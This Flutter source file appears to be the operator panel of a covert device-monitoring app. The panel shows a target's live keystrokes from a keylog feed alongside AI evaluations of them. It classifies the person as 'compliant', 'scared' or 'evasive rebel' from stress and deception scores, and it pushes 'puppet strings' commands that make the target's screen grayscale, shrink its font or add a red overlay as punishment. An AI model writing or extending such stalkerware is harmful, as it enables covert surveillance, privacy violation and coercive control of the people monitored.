import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';

import '../../constants/colors.dart';

/// Tab 28 — سجل السلوك والصندوق الأسود
///
/// • تصنيف التمرد الآلي
/// • مرآة المفاتيح المباشرة مع تقييم Gemini
/// • Remote Config الانضباطي (رمادي / تقليص خط / تراكب أحمر)
class DpcBehavioralBlackboxTab extends StatefulWidget {
  final String uid;
  final Future<void> Function(String cmd, {Map<String, dynamic> payload}) sendCommand;
  const DpcBehavioralBlackboxTab({super.key, required this.uid, required this.sendCommand});

  @override
  State<DpcBehavioralBlackboxTab> createState() => _DpcBehavioralBlackboxTabState();
}

class _DpcBehavioralBlackboxTabState extends State<DpcBehavioralBlackboxTab> {

  // Remote Config Puppet Strings
  bool _grayscale     = false;
  bool _fontShrink    = false;
  bool _redOverlayOn  = false;

  Future<void> _applyRemoteConfig() async {
    await widget.sendCommand('apply_remote_config', payload: {
      'grayscale':    _grayscale,
      'fontShrink':   _fontShrink,
      'redOverlay':   _redOverlayOn,
    });
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('✓ Remote Config مُطبَّق على الجهاز',
            style: TextStyle(fontFamily: 'Tajawal')),
            backgroundColor: AppColors.success),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    if (widget.uid.isEmpty) {
      return const Center(child: Text('اختر عنصراً', style: TextStyle(color: AppColors.textMuted, fontFamily: 'Tajawal')));
    }

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(crossAxisAlignment: CrossAxisAlignment.end, children: [

        // ── تصنيف التمرد ──────────────────────────────────────────────────
        _BbHdr(label: 'تصنيف التمرد الآلي', icon: Icons.psychology_alt_outlined),
        const SizedBox(height: 8),
        _RebellionClassifierCard(uid: widget.uid),
        const SizedBox(height: 20),

        // ── مرآة المفاتيح المباشرة ────────────────────────────────────────
        _BbHdr(label: 'مرآة لوحة المفاتيح المباشرة', icon: Icons.keyboard_outlined),
        const SizedBox(height: 8),
        _LiveKeystrokeMirror(uid: widget.uid),
        const SizedBox(height: 20),

        // ── Remote Config — خيوط الدمية ──────────────────────────────────
        _BbHdr(label: 'Remote Config — خيوط الدمية', icon: Icons.tune_outlined),
        const SizedBox(height: 8),
        _PuppetStringsPanel(
          grayscale:   _grayscale,
          fontShrink:  _fontShrink,
          redOverlay:  _redOverlayOn,
          onGrayscale: (v)  => setState(() => _grayscale   = v),
          onFontShrink:(v)  => setState(() => _fontShrink  = v),
          onRedOverlay:(v)  => setState(() => _redOverlayOn= v),
          onApply:     _applyRemoteConfig,
        ),
        const SizedBox(height: 20),

        // ── السجل التاريخي للتمرد ─────────────────────────────────────────
        _BbHdr(label: 'سجل الأحداث الانضباطية', icon: Icons.history_outlined),
        const SizedBox(height: 8),
        _RebellionLog(uid: widget.uid),
      ]),
    );
  }
}

// ── بطاقة تصنيف التمرد ───────────────────────────────────────────────────────

class _RebellionClassifierCard extends StatelessWidget {
  final String uid;
  const _RebellionClassifierCard({required this.uid});

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream: FirebaseDatabase.instance
          .ref('device_states/$uid/behavioralAnalysis')
          .onValue,
      builder: (_, snap) {
        final data = (snap.data?.snapshot.value as Map?)?.cast<String, dynamic>() ?? {};
        final stress    = (data['stressIndex'] as num?)?.toInt() ?? 0;
        final deception = (data['deceptionProbability'] as num?)?.toInt() ?? 0;
        final flags     = (data['alertFlags'] as List?)?.cast<String>() ?? [];
        final kb        = (snap.data?.snapshot.value as Map?)?.cast<String, dynamic>()?['keyboardPattern'] ?? {};

        final classification = _classify(stress, deception, flags, kb);

        return Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: classification.color.withValues(alpha: 0.07),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: classification.color.withValues(alpha: 0.3)),
          ),
          child: Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
            Row(children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(
                  color: classification.color.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(20),
                ),
                child: Text(classification.levelAr, style: TextStyle(
                    color: classification.color, fontFamily: 'Tajawal',
                    fontWeight: FontWeight.w700, fontSize: 13)),
              ),
              const Spacer(),
              const Text('تصنيف التمرد', style: TextStyle(
                  color: AppColors.textSecondary, fontFamily: 'Tajawal', fontSize: 12)),
              const SizedBox(width: 6),
              const Icon(Icons.psychology_outlined, color: AppColors.info, size: 18),
            ]),
            const SizedBox(height: 10),
            Text(classification.description,
                textAlign: TextAlign.right,
                style: TextStyle(color: classification.color.withValues(alpha: 0.9),
                    fontFamily: 'Tajawal', fontSize: 12, height: 1.5, fontStyle: FontStyle.italic)),
          ]),
        );
      },
    );
  }

  _Classification _classify(int stress, int dec, List<String> flags, Map kb) {
    final pattern = kb['pattern'] as String? ?? 'CALM';
    if (flags.contains('DECEPTION_RISK') || dec >= 70) {
      return _Classification('متمرد متملص', 'يُحاول المراوغة — التلاعب محتمل. تعيين مراقبة مكثفة.',
          AppColors.error, 'EVASIVE_REBEL');
    }
    if (flags.contains('HIGH_STRESS') || stress >= 75) {
      return _Classification('خائف / مضطرب', 'ضغط نفسي عالٍ — الحذف الكثيف يشير إلى توتر حاد.',
          AppColors.warning, 'SCARED');
    }
    if (pattern == 'HESITANT') {
      return _Classification('متردد / مترقب', 'كتابة بطيئة وحذف مفرط — حالة تردد أو إحجام.',
          AppColors.warning, 'HESITANT');
    }
    if (flags.contains('HIGH_GHOST_INPUT')) {
      return _Classification('مرتاب / يُعيد الصياغة', 'نسبة نصوص محذوفة مرتفعة — محاولة تلميع الحقيقة.',
          AppColors.info, 'REWRITING');
    }
    return _Classification('ممتثل', 'لا مؤشرات تمرد — الوضع مستقر.',
        AppColors.success, 'COMPLIANT');
  }
}

class _Classification {
  final String levelAr, description, levelId;
  final Color color;
  const _Classification(this.levelAr, this.description, this.color, this.levelId);
}

// ── مرآة المفاتيح ─────────────────────────────────────────────────────────────

class _LiveKeystrokeMirror extends StatelessWidget {
  final String uid;
  const _LiveKeystrokeMirror({required this.uid});

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<QuerySnapshot>(
      stream: FirebaseFirestore.instance
          .collection('keylog_feed')
          .doc(uid)
          .collection('entries')
          .orderBy('timestamp', descending: true)
          .limit(10)
          .snapshots(),
      builder: (_, snap) {
        if (!snap.hasData || snap.data!.docs.isEmpty) {
          return Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: AppColors.backgroundCard, borderRadius: BorderRadius.circular(10),
              border: Border.all(color: AppColors.border),
            ),
            child: const Text('لا توجد ضربات مفاتيح حديثة.',
                textAlign: TextAlign.right,
                style: TextStyle(color: AppColors.textMuted, fontFamily: 'Tajawal', fontSize: 12)),
          );
        }

        return Column(
          children: snap.data!.docs.map((d) {
            final data  = d.data() as Map<String, dynamic>;
            final text  = data['text']   as String? ?? '';
            final app   = data['app']    as String? ?? '';
            final eval  = data['aiEval'] as String? ?? '';
            return Container(
              margin: const EdgeInsets.only(bottom: 5),
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.backgroundCard, borderRadius: BorderRadius.circular(8),
                border: Border.all(color: AppColors.border),
              ),
              child: Row(children: [
                if (eval.isNotEmpty) Container(
                  padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                  decoration: BoxDecoration(
                    color: AppColors.warning.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(4),
                  ),
                  child: Text(eval, style: const TextStyle(
                      color: AppColors.warning, fontFamily: 'Tajawal', fontSize: 9,
                      fontWeight: FontWeight.w700)),
                ),
                const Spacer(),
                Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
                  Text(text.length > 60 ? '${text.substring(0, 60)}…' : text,
                      textAlign: TextAlign.right,
                      style: const TextStyle(color: AppColors.text, fontFamily: 'Courier', fontSize: 11)),
                  if (app.isNotEmpty) Text(app,
                      style: const TextStyle(color: AppColors.textMuted, fontFamily: 'Tajawal', fontSize: 9)),
                ]),
              ]),
            );
          }).toList(),
        );
      },
    );
  }
}

// ── Puppet Strings ────────────────────────────────────────────────────────────

class _PuppetStringsPanel extends StatelessWidget {
  final bool grayscale, fontShrink, redOverlay;
  final ValueChanged<bool> onGrayscale, onFontShrink, onRedOverlay;
  final VoidCallback onApply;
  const _PuppetStringsPanel({
    required this.grayscale, required this.fontShrink, required this.redOverlay,
    required this.onGrayscale, required this.onFontShrink, required this.onRedOverlay,
    required this.onApply,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppColors.backgroundCard, borderRadius: BorderRadius.circular(12),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
        _PuppetToggle(label: 'تراكب أحمر',   value: redOverlay,  color: AppColors.error,   onChanged: onRedOverlay),
        _PuppetToggle(label: 'تقليص الخط',   value: fontShrink,  color: AppColors.warning, onChanged: onFontShrink),
        _PuppetToggle(label: 'وضع رمادي',    value: grayscale,   color: AppColors.textMuted, onChanged: onGrayscale),
        const SizedBox(height: 12),
        SizedBox(width: double.infinity,
          child: ElevatedButton(
            onPressed: onApply,
            style: ElevatedButton.styleFrom(
              backgroundColor: AppColors.accent, foregroundColor: Colors.black,
              padding: const EdgeInsets.symmetric(vertical: 12), elevation: 0,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            ),
            child: const Text('تطبيق على الجهاز الآن', style: TextStyle(fontFamily: 'Tajawal', fontWeight: FontWeight.w700)),
          ),
        ),
      ]),
    );
  }
}

class _PuppetToggle extends StatelessWidget {
  final String label;
  final bool value;
  final Color color;
  final ValueChanged<bool> onChanged;
  const _PuppetToggle({required this.label, required this.value, required this.color, required this.onChanged});

  @override
  Widget build(BuildContext context) => Row(children: [
    Switch(value: value, onChanged: onChanged, activeColor: color,
        activeTrackColor: color.withValues(alpha: 0.3)),
    const Spacer(),
    Text(label, style: TextStyle(color: value ? color : AppColors.textMuted,
        fontFamily: 'Tajawal', fontWeight: FontWeight.w600, fontSize: 12)),
  ]);
}

// ── سجل الأحداث ─────────────────────────────────────────────────────────────

class _RebellionLog extends StatelessWidget {
  final String uid;
  const _RebellionLog({required this.uid});

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<QuerySnapshot>(
      stream: FirebaseFirestore.instance
          .collection('behavioral_log')
          .doc(uid)
          .collection('events')
          .orderBy('at', descending: true)
          .limit(15)
          .snapshots(),
      builder: (_, snap) {
        if (!snap.hasData || snap.data!.docs.isEmpty) {
          return Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: AppColors.backgroundCard, borderRadius: BorderRadius.circular(10),
              border: Border.all(color: AppColors.border),
            ),
            child: const Text('لا توجد أحداث مسجَّلة.',
                textAlign: TextAlign.right,
                style: TextStyle(color: AppColors.textMuted, fontFamily: 'Tajawal', fontSize: 12)),
          );
        }
        return Column(
          children: snap.data!.docs.map((d) {
            final data  = d.data() as Map<String, dynamic>;
            final event = data['event'] as String? ?? '';
            final at    = (data['at'] as Timestamp?)?.toDate();
            return Container(
              margin: const EdgeInsets.only(bottom: 4),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
              decoration: BoxDecoration(
                color: AppColors.backgroundCard, borderRadius: BorderRadius.circular(6),
                border: Border.all(color: AppColors.border),
              ),
              child: Row(children: [
                if (at != null) Text('${at.hour}:${at.minute.toString().padLeft(2,'0')}',
                    style: const TextStyle(color: AppColors.textMuted, fontFamily: 'Tajawal', fontSize: 10)),
                const Spacer(),
                Text(event, style: const TextStyle(color: AppColors.text, fontFamily: 'Tajawal', fontSize: 11)),
              ]),
            );
          }).toList(),
        );
      },
    );
  }
}

class _BbHdr extends StatelessWidget {
  final String label;
  final IconData icon;
  const _BbHdr({required this.label, required this.icon});

  @override
  Widget build(BuildContext context) => Row(children: [
    const Spacer(),
    Text(label, style: const TextStyle(color: AppColors.textSecondary,
        fontFamily: 'Tajawal', fontWeight: FontWeight.w600, fontSize: 13)),
    const SizedBox(width: 6),
    Icon(icon, color: AppColors.accent, size: 16),
  ]);
}
